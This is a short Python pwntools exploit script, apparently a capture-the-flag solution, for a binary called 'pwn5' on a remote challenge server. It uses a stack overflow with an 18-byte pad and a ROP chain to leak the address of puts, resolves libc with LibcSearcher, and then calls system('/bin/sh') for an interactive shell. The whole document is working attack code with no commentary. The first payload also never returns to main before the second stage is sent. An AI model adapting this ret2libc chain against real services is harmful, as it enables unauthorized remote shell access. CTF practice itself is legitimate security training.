from pwn import *
from LibcSearcher import LibcSearcher
sh = remote('gz.imxbt.cn',20336)
pwn5 = ELF('./pwn5')

puts_plt = pwn5.plt['puts']
puts_got = pwn5.got['puts']
print(hex(puts_plt))
main = pwn5.symbols['main']
print(hex(main))
pop_rdi_ret=0x0000000000401176 
pop_rsi_ret=0x0000000000401178
pop_rdx_ret=0x0000000000401221 
ret=0x000000000040101a

print("[*] Leak puts addr...")
payload=b'a'*18
payload+=p64(pop_rdi_ret)
payload+=p64(puts_got)
payload+=p64(puts_plt)
sh.sendlineafter(b"I have nothing, what should I do?", payload)
print("[*] Get the related addr:")
puts_addr = u64(sh.recv(8))
print(hex(puts_addr))

libc = LibcSearcher('puts', puts_addr)
libcbase = puts_addr - libc.dump('puts')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')

print("[*] Get shell...")
payload = b'a'*18
payload += p64(pop_rdi_ret)
payload += p64(binsh_addr)
payload += p64(system_addr)
sh.sendline(payload)

sh.interactive()